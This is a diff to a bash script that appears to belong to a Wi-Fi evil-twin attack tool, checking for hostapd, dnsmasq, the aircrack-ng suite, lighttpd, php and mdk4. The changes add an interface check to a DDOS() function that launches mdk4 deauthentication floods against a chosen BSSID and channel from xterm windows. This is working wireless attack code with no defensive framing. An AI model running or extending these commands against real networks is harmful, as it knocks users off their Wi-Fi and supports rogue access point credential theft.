@@ -30,10 +30,10 @@ $GRE
 echo $BLU
 echo " I will check some package installed ! "
 echo ""
-software=("hostapd" "dnsmasq"  "airmon-ng" "airodump-ng" "aircrack-ng" "aireplay-ng" "lighttpd" "php" "php-cgi" "fuser" "mdk4" "iptables" )
+software=("hostapd" "dnsmasq"  "airmon-ng" "airodump-ng" "aircrack-ng" "aireplay-ng" "lighttpd" "php" "php-cgi" "fuser" "mdk4" "iptables" "xterm" )
 for pkg in "${software[@]}"
 do
-sleep 0.5
+sleep 0.3
 if ! command -v $pkg &> /dev/null
 then 
 echo $BLU
@@ -378,6 +378,14 @@ DDOS(){
   cat evil.txt
   echo $BLU
   echo ""
+  empty2=`cat info/ddos_interface.txt`
+  if [ -z $empty2 ] 2> /dev/null
+  then 
+  echo $RED
+  sleep 1
+  echo "sorry !! you don't have any other wifi card !"
+  sleep 3
+  else
   echo "select ddos attack interface ..! "
   echo ""
   ddosinterface=`cat info/ddos_interface.txt`
@@ -389,7 +397,7 @@ DDOS(){
   sudo airmon-ng start $dinterface2 > /dev/null 2>&1
   sudo xterm -fg red -geometry 100x30-0+0 -e mdk4 $dinterface2 d -c $CHANNEL -B $BSSID & > /dev/null 2>&1
   sudo xterm -fg red -geometry 100x30-0+0 -e mdk4 $dinterface2"mon" d -c $CHANNEL -B $BSSID & > /dev/null 2>&1
-
+  fi
   ;;
   *)
   sudo xterm -fg red -geometry 100x30-0+0 -e mdk4 $interf d -c $CHANNEL -B $BSSID & > /dev/null 2>&1 
